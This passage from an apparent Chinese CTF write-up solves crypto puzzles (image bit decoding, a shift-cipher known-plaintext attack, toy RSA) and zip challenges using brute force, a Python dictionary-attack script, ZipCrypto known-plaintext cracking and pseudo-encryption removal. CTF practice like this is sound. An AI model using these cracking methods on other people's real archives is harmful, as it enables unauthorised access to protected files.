Image</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./Dancing_Line.bmp&#x27;</span>)</span><br><span class=\"line\">w,h=img.size</span><br><span class=\"line\"><span class=\"comment\">#print(w,h)</span></span><br><span class=\"line\">pos=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(w):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(h):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))!=(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))==(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t\t\tpos.append((i,j))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(pos)</span><br></pre></td></tr></table></figure><br />\n 得到如下字串：</p>\n<blockquote>\n<p>[(0, 0), (5, 3), (8, 8), (13, 11), (16, 16), (20, 20), (22, 26), (28, 28), (33, 31), (36, 36), (40, 40), (45, 43), (48, 48), (51, 53), (53, 59), (58, 62), (63, 65), (66, 70), (70, 74), (72, 80), (77, 83), (81, 87), (83, 93), (87, 97), (90, 102), (93, 107), (98, 110), (100, 116), (105, 119), (109, 123), (112, 128), (116, 132), (120, 136), (122, 142), (127, 145), (131, 149), (133, 155), (135, 161)]</p>\n</blockquote>\n<p>仔细找找规律可以发现，相邻黑点坐标之差均为 8<br />\n 同理导出线上所有点的坐标，不难看出，相邻点的坐标，要么是横坐标加 1，要么是纵坐标加 1，</p>\n<p>再结合相邻黑点坐标差为 8 这个数字，所以推测这应该是一个二进制编码 （。＾▽＾）<br />\n几番尝试之后确定为，纵坐标增长为 1，横坐标增长为 0</p>\n<p>最后将二进制转换为 ASCII 码，即可得到 flag</p>\n<p>完整 exp 如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> PIL <span class=\"keyword\">import</span> Image</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\">img=Image.<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;./Dancing_Line.bmp&#x27;</span>)</span><br><span class=\"line\">w,h=img.size</span><br><span class=\"line\"><span class=\"comment\">#print(w,h)</span></span><br><span class=\"line\">pos=[]</span><br><span class=\"line\">pos_all=[]</span><br><span class=\"line\">t=<span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(w):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(h):</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))!=(<span class=\"number\">255</span>,<span class=\"number\">255</span>,<span class=\"number\">255</span>):</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> img.getpixel((i,j))==(<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>):</span><br><span class=\"line\">\t\t\t\tpos.append((i,j))</span><br><span class=\"line\">\t\t\tpos_all.append((i,j))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#print(pos)</span></span><br><span class=\"line\"><span class=\"comment\">#print(pos_all)</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">1</span>,<span class=\"built_in\">len</span>(pos_all)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> pos_all[k][<span class=\"number\">0</span>]-pos_all[k-<span class=\"number\">1</span>][<span class=\"number\">0</span>]==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tt=t+<span class=\"string\">&#x27;1&#x27;</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> pos_all[k][<span class=\"number\">1</span>]-pos_all[k-<span class=\"number\">1</span>][<span class=\"number\">1</span>]==<span class=\"number\">0</span>:</span><br><span class=\"line\">\t\tt=t+<span class=\"string\">&#x27;0&#x27;</span></span><br><span class=\"line\">t=<span class=\"built_in\">int</span>(t,<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(t.to_bytes((t.bit_length() + <span class=\"number\">7</span>) // <span class=\"number\">8</span>, <span class=\"string\">&#x27;big&#x27;</span>).decode())</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"english-novel\"><a class=\"anchor\" href=\"#english-novel\">#</a> English Novel</h3>\n<p>做是做出来了，就是原来写的脚本稀烂，由于标点符号的原因，整理出来的 keys，有些地方不太对，这就导致我最开始写的脚本，得到的 flag 其实是长这样的： <code>hgame&#123;V0_y0u_kn0w_'En0wn-pla1ntext_derzwn'?&#125;</code> <br />\n(￣▽￣)&quot;</p>\n<p>然后我直接猜出最终的 flag... 讲真挺好猜的<br />\n不过看过别人的 wp 之后，我就在原基础上改善了（现在没问题了）</p>\n<p>这道题思路其实很简单，<br />\n题目给了我们两个文件夹，一个 original，一个 encrypt，<span class=\"exturl\" data-url=\"aHR0cDovL3huLS1mbGFnLWs4NGZ1aTB3eDYwMmEyNzVhLnhuLS1lbmNlbmNyeXB0LWpoN3EucHk=\">还给了一个 flag.enc 和 encrypt.py</span><br />\n 首先都打开来看看，original 里面是打乱的 English Novel 的原文，encrypt 里面大概就是通过某种加密得到的打乱的密文，flag.enc 里面大概就是用同样方法加密得到的 flag， encrypt.py 就是加密的方法</p>\n<p>打开 encrypt.py 看看，其实就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>c</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>m</mi><mo>+</mo><mi>k</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">c=(m+k) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span><br />\n 那解密就是 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>m</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>c</mi><mo>−</mo><mi>k</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">m=(c-k) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.4306em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span> （c 为密文，m 为明文，k 为密钥）<br />\n所以显然我们的任务就是得到这个密钥 k，然后解密 flag.enc 里的密文</p>\n<p>而题目把一大堆明文和密文都给我们了，所以就是已知明文攻击，<br />\n所以， <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>k</mi><mo>=</mo><mo stretchy=\"false\">(</mo><mi>c</mi><mo>−</mo><mi>m</mi><mo stretchy=\"false\">)</mo><mi>m</mi><mi>o</mi><mi>d</mi><mn>26</mn></mrow><annotation encoding=\"application/x-tex\">k=(c-m) mod 26</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.6944em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.03148em;\">k</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\">c</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span><span class=\"mbin\">−</span><span class=\"mspace\" style=\"margin-right:0.2222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">m</span><span class=\"mclose\">)</span><span class=\"mord mathnormal\">m</span><span class=\"mord mathnormal\">o</span><span class=\"mord mathnormal\">d</span><span class=\"mord\">26</span></span></span></span><br />\n 关键点就在怎么把打乱 encrypt 和 original 一一对应起来，而且要排除标点符号对求 key 的干扰<br />\n因为仔细看 encrypt.py 的话，标点符号虽然不会参与加密，但是还是会占据一个 key 的位置</p>\n<p>用 isalpha () 的功能判断字母，然后把字母替换成 &quot;*&quot;，保留标点符号，这样得到的字符串相当于一个标准的模板，对于对应的 original 和 encrypt 来说，他们的 template 都是一样的，这样就能把原文和密文对应起来。<br />\n找到了对应的原文和密文，解得正确的 key 就比较容易了（不过要记得排除标点符号的干扰）<br />\nexp 如下：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> os</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 函数功能：把字母变成‘*’，保留标点符号</span></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">get_feature</span>(<span class=\"params\">s</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"string\">&quot;&quot;</span>.join([<span class=\"string\">&#x27;*&#x27;</span> <span class=\"keyword\">if</span> c.isalpha() <span class=\"keyword\">else</span> c <span class=\"keyword\">for</span> c <span class=\"keyword\">in</span> s]) </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 用original文件夹初始化template，并将原文保存在txts_ori里面</span></span><br><span class=\"line\">path_ori=<span class=\"string\">&#x27;original&#x27;</span></span><br><span class=\"line\">files_ori=os.listdir(path_ori)</span><br><span class=\"line\">template=[]</span><br><span class=\"line\">txts_ori = []</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files_ori:</span><br><span class=\"line\">\tposition = path_ori+<span class=\"string\">&#x27;\\\\&#x27;</span>+ file</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(position, <span class=\"string\">&quot;r&quot;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\tdata = f.read()</span><br><span class=\"line\">\t\tm=get_feature(data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(m)!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> m <span class=\"keyword\">not</span> <span class=\"keyword\">in</span> template:</span><br><span class=\"line\">\t\t\ttxts_ori.append(data)</span><br><span class=\"line\">\t\t\ttemplate.append(m)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 处理encrypt文件夹内的数据，在template里匹配对应的原文，得到对应的密钥</span></span><br><span class=\"line\">keys=[-<span class=\"number\">1</span>]*<span class=\"number\">410</span></span><br><span class=\"line\">path_enc=<span class=\"string\">&#x27;encrypt&#x27;</span></span><br><span class=\"line\">files_enc=os.listdir(path_enc)</span><br><span class=\"line\"><span class=\"keyword\">for</span> file <span class=\"keyword\">in</span> files_enc:</span><br><span class=\"line\">\tposition = path_enc+<span class=\"string\">&#x27;\\\\&#x27;</span>+ file</span><br><span class=\"line\">\t<span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(position, <span class=\"string\">&quot;r&quot;</span>,encoding=<span class=\"string\">&#x27;utf-8&#x27;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">\t\tdata = f.read()</span><br><span class=\"line\">\t\tm=get_feature(data)</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> <span class=\"built_in\">len</span>(m)!=<span class=\"number\">0</span> <span class=\"keyword\">and</span> m <span class=\"keyword\">in</span> template:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(data)):</span><br><span class=\"line\">\t\t\t\tk=((<span class=\"built_in\">ord</span>(data[i])-<span class=\"built_in\">ord</span>(txts_ori[template.index(m)][i]))%<span class=\"number\">26</span>)</span><br><span class=\"line\">\t\t\t\tj=i%(<span class=\"built_in\">len</span>(keys))</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">#保证每次写入keys时该位置没有写入过，且对应密文不是标点符号</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> keys[j]==-<span class=\"number\">1</span> <span class=\"keyword\">and</span> m[i]==<span class=\"string\">&#x27;*&#x27;</span>:</span><br><span class=\"line\">\t\t\t\t\tkeys[j]=k</span><br><span class=\"line\"><span class=\"comment\"># 用keys解密</span></span><br><span class=\"line\">enc=<span class=\"string\">&quot;xaawr&#123;B0_d0l_cs0m_&#x27;Pp0mn-odn1vpabt_deqzcq&#x27;?&#125;&quot;</span></span><br><span class=\"line\">result = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(enc)):</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> enc[i].isupper():</span><br><span class=\"line\">\t\tresult += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - keys[i] - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;A&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> enc[i].islower():</span><br><span class=\"line\">\t\tresult += <span class=\"built_in\">chr</span>((<span class=\"built_in\">ord</span>(enc[i]) - keys[i] - <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>)) % <span class=\"number\">26</span> + <span class=\"built_in\">ord</span>(<span class=\"string\">&#x27;a&#x27;</span>))</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\tresult += enc[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(result)</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"easy-rsa\"><a class=\"anchor\" href=\"#easy-rsa\">#</a> Easy RSA</h3>\n<p>这道题，还是不细说了，属于是最最最基本的 RSA 了，<br />\n该给的全都给了，连 p, q 都直接给了<br />\n exp:<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> gmpy2</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.number <span class=\"keyword\">import</span> long_to_bytes</span><br><span class=\"line\"></span><br><span class=\"line\">string=[]</span><br><span class=\"line\"><span class=\"keyword\">for</span> (e,p,q,c) <span class=\"keyword\">in</span> [(<span class=\"number\">12433</span>, <span class=\"number\">149</span>, <span class=\"number\">197</span>, <span class=\"number\">104</span>), (<span class=\"number\">8147</span>, <span class=\"number\">131</span>, <span class=\"number\">167</span>, <span class=\"number\">6633</span>), (<span class=\"number\">10687</span>, <span class=\"number\">211</span>, <span class=\"number\">197</span>, <span class=\"number\">35594</span>), (<span class=\"number\">19681</span>, <span class=\"number\">131</span>, <span class=\"number\">211</span>, <span class=\"number\">15710</span>), (<span class=\"number\">33577</span>, <span class=\"number\">251</span>, <span class=\"number\">211</span>, <span class=\"number\">38798</span>), (<span class=\"number\">30241</span>, <span class=\"number\">157</span>, <span class=\"number\">251</span>, <span class=\"number\">35973</span>), (<span class=\"number\">293</span>, <span class=\"number\">211</span>, <span class=\"number\">157</span>, <span class=\"number\">31548</span>), (<span class=\"number\">26459</span>, <span class=\"number\">179</span>, <span class=\"number\">149</span>, <span class=\"number\">4778</span>), (<span class=\"number\">27479</span>, <span class=\"number\">149</span>, <span class=\"number\">223</span>, <span class=\"number\">32728</span>), (<span class=\"number\">9029</span>, <span class=\"number\">223</span>, <span class=\"number\">137</span>, <span class=\"number\">20696</span>), (<span class=\"number\">4649</span>, <span class=\"number\">149</span>, <span class=\"number\">151</span>, <span class=\"number\">13418</span>), (<span class=\"number\">11783</span>, <span class=\"number\">223</span>, <span class=\"number\">251</span>, <span class=\"number\">14239</span>), (<span class=\"number\">13537</span>, <span class=\"number\">179</span>, <span class=\"number\">137</span>, <span class=\"number\">11702</span>), (<span class=\"number\">3835</span>, <span class=\"number\">167</span>, <span class=\"number\">139</span>, <span class=\"number\">20051</span>), (<span class=\"number\">30983</span>, <span class=\"number\">149</span>, <span class=\"number\">227</span>, <span class=\"number\">23928</span>), (<span class=\"number\">17581</span>, <span class=\"number\">157</span>, <span class=\"number\">131</span>, <span class=\"number\">5855</span>), (<span class=\"number\">35381</span>, <span class=\"number\">223</span>, <span class=\"number\">179</span>, <span class=\"number\">37774</span>), (<span class=\"number\">2357</span>, <span class=\"number\">151</span>, <span class=\"number\">223</span>, <span class=\"number\">1849</span>), (<span class=\"number\">22649</span>, <span class=\"number\">211</span>, <span class=\"number\">229</span>, <span class=\"number\">7348</span>), (<span class=\"number\">1151</span>, <span class=\"number\">179</span>, <span class=\"number\">223</span>, <span class=\"number\">17982</span>), (<span class=\"number\">8431</span>, <span class=\"number\">251</span>, <span class=\"number\">163</span>, <span class=\"number\">30226</span>), (<span class=\"number\">38501</span>, <span class=\"number\">193</span>, <span class=\"number\">211</span>, <span class=\"number\">30559</span>), (<span class=\"number\">14549</span>, <span class=\"number\">211</span>, <span class=\"number\">151</span>, <span class=\"number\">21143</span>), (<span class=\"number\">24781</span>, <span class=\"number\">239</span>, <span class=\"number\">241</span>, <span class=\"number\">45604</span>), (<span class=\"number\">8051</span>, <span class=\"number\">179</span>, <span class=\"number\">131</span>, <span class=\"number\">7994</span>), (<span class=\"number\">863</span>, <span class=\"number\">181</span>, <span class=\"number\">131</span>, <span class=\"number\">11493</span>), (<span class=\"number\">1117</span>, <span class=\"number\">239</span>, <span class=\"number\">157</span>, <span class=\"number\">12579</span>), (<span class=\"number\">7561</span>, <span class=\"number\">149</span>, <span class=\"number\">199</span>, <span class=\"number\">8960</span>), (<span class=\"number\">19813</span>, <span class=\"number\">239</span>, <span class=\"number\">229</span>, <span class=\"number\">53463</span>), (<span class=\"number\">4943</span>, <span class=\"number\">131</span>, <span class=\"number\">157</span>, <span class=\"number\">14606</span>), (<span class=\"number\">29077</span>, <span class=\"number\">191</span>, <span class=\"number\">181</span>, <span class=\"number\">33446</span>), (<span class=\"number\">18583</span>, <span class=\"number\">211</span>, <span class=\"number\">163</span>, <span class=\"number\">31800</span>), (<span class=\"number\">30643</span>, <span class=\"number\">173</span>, <span class=\"number\">191</span>, <span class=\"number\">27293</span>), (<span class=\"number\">11617</span>, <span class=\"number\">223</span>, <span class=\"number\">251</span>, <span class=\"number\">13448</span>), (<span class=\"number\">19051</span>, <span class=\"number\">191</span>, <span class=\"number\">151</span>, <span class=\"number\">21676</span>), (<span class=\"number\">18367</span>, <span class=\"number\">179</span>, <span class=\"number\">157</span>, <span class=\"number\">14139</span>), (<span class=\"number\">18861</span>, <span class=\"number\">149</span>, <span class=\"number\">191</span>, <span class=\"number\">5139</span>), (<span class=\"number\">9581</span>, <span class=\"number\">211</span>, <span class=\"number\">193</span>, <span class=\"number\">25595</span>)]:</span><br><span class=\"line\">\td = <span class=\"built_in\">int</span>(gmpy2.invert(e, (p-<span class=\"number\">1</span>)*(q-<span class=\"number\">1</span>)))</span><br><span class=\"line\">\tm = <span class=\"built_in\">pow</span>(c, d, p*q)</span><br><span class=\"line\">\tstring.append(long_to_bytes(m).decode())</span><br><span class=\"line\">Str=<span class=\"string\">&#x27;&#x27;</span>.join(string)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(Str)</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"misc\"><a class=\"anchor\" href=\"#misc\">#</a> Misc</h2>\n<h3 id=\"这个压缩包有点麻烦\"><a class=\"anchor\" href=\"#这个压缩包有点麻烦\">#</a> 这个压缩包有点麻烦</h3>\n<p>这道题属实是把那些，基本的有关压缩包的方法都涉及到了，挺全面的入门题</p>\n<h4 id=\"暴力破解\"><a class=\"anchor\" href=\"#暴力破解\">#</a> 暴力破解</h4>\n<p>打开压缩包，三个文件都被加密，不太正常，所以考虑暴力破解或者是伪加密能直接解出。<br />\n用 010 打开，文件最后出现提示：</p>\n<blockquote>\n<p>Pure numeric passwords within 6 digits are not safe!</p>\n</blockquote>\n<p>所以用 ARCHPR 暴力破解，范围仅勾选数字，得到密码：483279</p>\n<h4 id=\"字典攻击\"><a class=\"anchor\" href=\"#字典攻击\">#</a> 字典攻击</h4>\n<p>上一轮的密码解压得到三个文件：flag.zip、password-note.txt、README.txt<br />\n 要解压 flag.zip 又需要密码，打开 README.txt 看到提示：</p>\n<blockquote>\n<p>I don't know if it's a good idea to write down all the passwords.</p>\n</blockquote>\n<p>显然 passwords 可能的都被写在 password-note.txt 里面了<br />\n用 ARCHPR 的字典攻击即可，得到密码：&amp;-`;qpCKliw2yTR\\</p>\n<p>之后又尝试写了一个脚本，运行也可以得到密码：<br />\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> zipfile</span><br><span class=\"line\">zip_file = zipfile.ZipFile(<span class=\"string\">&#x27;flag.zip&#x27;</span>)</span><br><span class=\"line\">zip_list = zip_file.namelist()</span><br><span class=\"line\">f=<span class=\"built_in\">open</span>(<span class=\"string\">&#x27;password-note.txt&#x27;</span>, <span class=\"string\">&quot;r&quot;</span>)</span><br><span class=\"line\">lines = f.readlines()</span><br><span class=\"line\"><span class=\"keyword\">for</span> password <span class=\"keyword\">in</span> lines:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        zip_file.extractall(path=<span class=\"string\">&#x27;Test&#x27;</span>, pwd=password[:-<span class=\"number\">1</span>].encode(<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\">        <span class=\"built_in\">print</span>(<span class=\"string\">&quot;the password is &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(password[:-<span class=\"number\">1</span>]))</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        <span class=\"comment\">#print(&quot;the password is &#123;&#125;&quot;.format(password[:-1]))</span></span><br><span class=\"line\">        <span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure></p>\n<h4 id=\"明文攻击\"><a class=\"anchor\" href=\"#明文攻击\">#</a> 明文攻击</h4>\n<p>解压后又得到了一个 flag.zip 和 README.txt... (/▽＼)<br />\n flag.zip 中的内容一样被加密，其中包含 flag.jpg 和 README.txt<br />\n 仔细观察发现，两个 README.txt 的大小都是 68KB，所以考虑可能是明文攻击</p>\n<p>再看一下 README.txt，有提示</p>\n<blockquote>\n<p>If you don't like to spend time compressing files, just stores them.</p>\n</blockquote>\n<p>联系 flag.zip 的加密算法：ZipCrypto Store，已经基本可以确定是明文了，</p>\n<p>把给的 README.txt 用 Zip 的存储方式加密，打开对比两个 README.txt 的 CRC 值，<br />\n均为 966AC0E8</p>\n<p>再次使用 ARCHPR，选择明文攻击，<br />\n等待 1~2 分钟左右点击停止即可，不用等它执行完</p>\n<h4 id=\"伪加密\"><a class=\"anchor\" href=\"#伪加密\">#</a> 伪加密</h4>\n<p>明文攻击后得到了去除密码的一个 zip，<br />\n解压得到 flag.jpg 如下：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437720/Typera/2023/04/11a450d036a1c818089a7374c1f615a3.jpg\" alt=\"hgameM10\" /><br />\n 实际上从 7z 里面是能直接再点开这个 flag.jpg 的，可以看到里面还有一个 flag.jpg (￣_,￣)<br />\n 显然这个 flag.jpg 后面还藏了一个压缩包，使用 binwalk 分离，得到 4FC5.zip</p>\n<p>虽然有点奇怪，这里 7z 为啥不能直接打开这个新的压缩包，但尝试之后发现这个确实是伪加密<br />\n直接更改下图选中内容为 00 即可<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437699/Typera/2023/04/63704e239d39fc6a92fc0cb525370a7b.png\" alt=\"image-20230425234814596\" /></p>\n<p>终于得到了 flag：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437761/Typera/2023/04/53c11a8e13bbe5c3adfdef057ed8493c.png\" alt=\"image-20230425234917756\" /></p>\n<h3 id=\"好康的流量\"><a class=\"anchor\" href=\"#好康的流量\">#</a> 好康的流量</h3>\n<p>Wireshark 打开，右键 -&gt; 追踪流 -&gt;TCP 流，得到 base64 格式的图片文件：<br />\n<img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437776/Typera/2023/04/c529efa42a73e54e0034029e844f57ca.png\" alt=\"image-20230425234931156\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudG9vbG5iLmNvbS90b29scy9iYXNlNjRUb0ltYWdlcy5odG1s\">在线 base64 转换图片</span>得到：</p>\n<p><img data-src=\"https://res.cloudinary.com/sycamore/image/upload/v1682437788/Typera/2023/04/7299c09dac948f983d1c5126055c377d.png\" alt=\"image-20230425234943176\" /></p>\n<p>stegsolve 打开，G2 得到一个条形码：</p>\n<p><img 